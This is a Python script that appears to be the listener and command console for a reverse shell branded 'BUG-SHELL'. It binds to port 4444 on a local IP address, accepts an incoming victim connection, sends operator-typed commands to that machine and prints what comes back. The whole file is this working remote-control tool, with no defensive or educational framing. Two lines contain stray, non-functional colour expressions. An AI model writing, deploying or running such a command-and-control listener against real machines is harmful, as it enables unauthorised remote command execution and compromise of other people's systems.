from colorama import Fore, init
import socket
import os
import time
import sys

def print_ascii_art_slow(ascii_art, delay=0.2):
    init(autoreset=True)
    for line in ascii_art.split('\n'):
        colored_ascii_art = f"{Fore.RED}{line}{Fore.RESET}"
        print(colored_ascii_art)
        time.sleep(delay)

ascii_art = r"""
██████  ██    ██  ██████        ███████ ██   ██ ███████ ██      ██          
██   ██ ██    ██ ██             ██      ██   ██ ██      ██      ██          
██████  ██    ██ ██   ███ █████ ███████ ███████ █████   ██      ██          
██   ██ ██    ██ ██    ██            ██ ██   ██ ██      ██      ██      
██████   ██████   ██████        ███████ ██   ██ ███████ ███████ ███████
                                                                                                                                                                                                           
"""
print_ascii_art_slow(ascii_art)

SERVER = "192.168.1.171"
PORT = 4444
IP = "192.168.1.171"

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER, PORT))

s.listen(1)

while True:
    print(f'{Fore.BLUE}Listening as: {IP} on port: {PORT}{Fore.RESET}')

    client = s.accept()
    print(f'{Fore.BLUE}❗New client connected to the server with IP: {client[1]}❗{Fore.RESET}')

    client[0].send('connected'.encode())
    while True:
        {Fore.BLUE}
        cmd = input('command>>> ')
        {Fore.RESET}
        client[0].send(cmd.encode())

        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            break

        result = client[0].recv(1024).decode()
        print(result)

    client[0].close()

    cmd = input('Wait for new client y/n') or 'y'
    if cmd.lower() in ['n', 'no']:
        break

s.close()